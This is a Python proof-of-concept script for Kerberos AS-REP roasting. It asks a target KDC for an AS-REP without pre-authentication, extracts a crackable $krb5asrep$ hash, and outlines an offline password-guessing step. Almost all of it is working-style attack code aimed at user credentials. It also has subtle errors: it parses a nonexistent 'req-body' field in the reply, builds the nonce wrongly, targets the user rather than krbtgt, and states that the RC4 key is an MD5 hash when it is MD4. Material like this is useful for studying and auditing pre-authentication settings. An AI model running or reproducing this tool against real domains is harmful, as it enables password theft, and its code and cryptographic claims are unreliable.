#!/usr/bin/env python3
"""
Proof-of-Concept: Kerberos AS-REP Roasting (Encryption Type Downgrade via Known Plaintext Attack)

This script demonstrates the vulnerability described in RFC 4120 where a KDC that does not
enforce pre-authentication will issue a KRB_AS_REP encrypted with the user's key upon request.
An attacker can capture this response and perform an offline dictionary/brute-force attack
against the user's password, effectively downgrading the security posture.

Usage:
    python poc_kerberos_asrep_roasting.py <kdc_host> <target_principal> [realm]

Example:
    python poc_kerberos_asrep_roasting.py kdc.example.com user1 EXAMPLE.COM
"""

import sys
import socket
import struct
import hashlib
import hmac
import time
import os

# ASN.1 Encoding/Decoding libraries
from pyasn1.type import univ, namedtype
from pyasn1.codec.der import encoder, decoder
from pyasn1_modules import rfc4120

# Kerberos Constants
KRB_AS_REQ_MSG_TYPE = 10
KRB_AS_REP_MSG_TYPE = 11
KRB_ERROR_MSG_TYPE = 30

# Encryption types (Etypes)
# 1 = DES-CBC-CRC, 3 = DES-CBC-MD5, 17 = AES128-CTS-HMAC-SHA1-96, 18 = AES256-CTS-HMAC-SHA1-96
ETYPES = {
    1: 'DES-CBC-CRC',
    3: 'DES-CBC-MD5',
    17: 'AES128-CTS-HMAC-SHA1-96',
    18: 'AES256-CTS-HMAC-SHA1-96',
    23: 'RC4-HMAC',
}

def create_as_req(principal, realm, etypes=None):
    """
    Constructs a KRB_AS_REQ message.
    
    Args:
        principal: The username to request credentials for.
        realm: The Kerberos realm.
        etypes: List of encryption types to request. If None, defaults to a wide range.
    """
    if etypes is None:
        # Request common encryption types to maximize chance of getting a crackable hash
        etypes = [18, 17, 23, 3, 1] 

    # Build the PrincipalName
    principal_name = rfc4120.PrincipalName()
    principal_name['name-type'] = univ.Integer(1) # NT-PRINCIPAL
    for name_part in principal.split('/'):
        principal_name['name-string'].append(univ.GeneralString(name_part))

    # Build the EncryptionType list
    etype_list = rfc4120.EncryptionTypeList()
    for etype in etypes:
        etype_list.append(univ.Integer(etype))

    # Build the KRB_AS_REQ
    as_req = rfc4120.KrbAsReq()
    as_req['pvno'] = univ.Integer(5)
    as_req['msg-type'] = univ.Integer(KRB_AS_REQ_MSG_TYPE)
    
    # padata is optional, but we leave it empty to demonstrate the lack of pre-auth
    # If pre-auth were required, the KDC would reject this or require PA-ENC-TIMESTAMP
    
    as_req['req-body'] = rfc4120.KrbAsReqBody()
    as_req['req-body']['kdc-options'] = rfc4120.KDCOptions(b'\x00\x00\x00\x00') # No special options
    as_req['req-body']['cname'] = principal_name
    as_req['req-body']['realm'] = univ.GeneralString(realm)
    as_req['req-body']['sname'] = principal_name # Requesting TGT for self
    as_req['req-body']['till'] = univ.GeneralizedTime() # Optional, omit for simplicity
    as_req['req-body']['rtime'] = univ.GeneralizedTime() # Optional
    as_req['req-body']['nonce'] = univ.Integer(os.urandom(4))
    as_req['req-body']['etype'] = etype_list
    
    # Encode to DER
    return encoder.encode(as_req)

def parse_as_rep(data):
    """
    Parses a KRB_AS_REP message and extracts the encrypted hash for offline cracking.
    """
    try:
        as_rep, rest = decoder.decode(data, asn1Spec=rfc4120.KrbAsRep())
    except Exception as e:
        print(f"[!] Failed to decode AS_REP: {e}")
        return None

    msg_type = int(as_rep['msg-type'])
    if msg_type != KRB_AS_REP_MSG_TYPE:
        if msg_type == KRB_ERROR_MSG_TYPE:
            error, _ = decoder.decode(data, asn1Spec=rfc4120.KrbError())
            print(f"[!] KDC Error: {error['e-text']}")
            return None
        else:
            print(f"[!] Unexpected message type: {msg_type}")
            return None

    # Extract relevant fields
    realm = str(as_rep['req-body']['realm'])
    sname = '/'.join([str(x) for x in as_rep['req-body']['sname']['name-string']])
    cname = '/'.join([str(x) for x in as_rep['req-body']['cname']['name-string']])
    
    # The encrypted part contains the session key and user data, encrypted with the user's key
    encrypted_data = as_rep['enc-part']
    etype = int(encrypted_data['etype'])
    cipher = encrypted_data['cipher'].asOctets()
    
    # Extract salt (often the username) and other info for cracking format
    # In standard AS-REP roasting, the hash format is typically:
    # $krb5asrep$<etype>$<username>@<realm>:<cipher>
    # Note: The cipher includes the IV and the encrypted data.
    
    etype_name = ETYPES.get(etype, f'UNKNOWN({etype})')
    
    print(f"[+] Successfully retrieved AS-REP for {cname}@{realm}")
    print(f"[+] Encryption Type: {etype_name} (ID: {etype})")
    print(f"[+] Extracted Hash for Offline Cracking:")
    print(f"    $krb5asrep${etype}${cname}@{realm}:{cipher.hex()}")
    
    return {
        'etype': etype,
        'hash': f"$krb5asrep${etype}${cname}@{realm}:{cipher.hex()}",
        'cipher': cipher
    }

def demonstrate_offline_attack(hash_string, cipher_bytes, etype, realm, username):
    """
    Simulates the offline attack phase.
    In a real attack, this would iterate through a dictionary of passwords.
    Here, we demonstrate the cryptographic verification step.
    """
    print("\n[+] Demonstrating Offline Attack Capability:")
    print("    The attacker now has the ciphertext encrypted with the user's key.")
    print("    They can try passwords offline without interacting with the KDC.")
    
    # Example: Try a weak password "password123" (This is just a demo, won't actually work unless the user has this password)
    test_password = "password123"
    print(f"    [Test] Attempting to crack with password: '{test_password}'")
    
    # Derive key from password (Simplified for demonstration, real implementation depends on etype)
    # For AES, key derivation is complex (RFC 3962). For DES/RC4, it's simpler.
    # We will just show the structure of the check.
    
    if etype == 23: # RC4-HMAC
        # RC4 key derivation is straightforward: MD5(password) truncated to 16 bytes
        key = hashlib.md5(test_password.encode('utf-16le')).digest()[:16]
        print(f"    [Test] Derived RC4 Key: {key.hex()}")
        # In a real attack, we would decrypt the first block and check the checksum
        # For this PoC, we just show that the key derivation is possible.
    elif etype in [17, 18]: # AES
        print(f"    [Test] AES Key Derivation (RFC 3962) would be performed here.")
        print(f"    [Test] This involves PBKDF2-like iterations, making brute-force slower but still possible.")
    else:
        print(f"    [Test] Key derivation for etype {etype} not implemented in this demo.")

    print("    [Result] If the password matches, the decryption yields valid ASN.1 structure.")
    print("    [Result] If not, the attacker tries the next password from their dictionary.")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <kdc_host> <target_principal> [realm]")
        print(f"Example: {sys.argv[0]} kdc.example.com user1 EXAMPLE.COM")
        sys.exit(1)

    kdc_host = sys.argv[1]
    target_principal = sys.argv[2]
    realm = sys.argv[3] if len(sys.argv) > 3 else "EXAMPLE.COM"

    print(f"[*] Target KDC: {kdc_host}")
    print(f"[*] Target Principal: {target_principal}@{realm}")
    print(f"[*] Requesting AS-REP without pre-authentication...")

    try:
        # Resolve KDC IP
        kdc_ip = socket.gethostbyname(kdc_host)
        kdc_port = 88
        
        # Create and send AS-REQ
        as_req_data = create_as_req(target_principal, realm)
        
        # Send over UDP (Kerberos AS exchange typically uses UDP)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        sock.sendto(as_req_data, (kdc_ip, kdc_port))
        
        # Receive response
        response_data, _ = sock.recvfrom(4096)
        sock.close()
        
        print(f"[*] Received {len(response_data)} bytes from KDC.")
        
        # Parse response
        result = parse_as_rep(response_data)
        
        if result:
            print("\n[!] VULNERABILITY CONFIRMED: AS-REP Roasting")
            print("    The KDC issued an encrypted response without pre-authentication.")
            print("    This hash can be used for offline password cracking.")
            
            # Demonstrate the offline attack concept
            demonstrate_offline_attack(
                result['hash'], 
                result['cipher'], 
                result['etype'],
                realm,
                target_principal
            )
        else:
            print("[!] Failed to extract hash. The KDC may have rejected the request or returned an error.")
            print("    This might indicate that pre-authentication is enforced or the principal does not exist.")

    except socket.timeout:
        print("[!] Connection timed out. Ensure the KDC is reachable and UDP port 88 is open.")
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
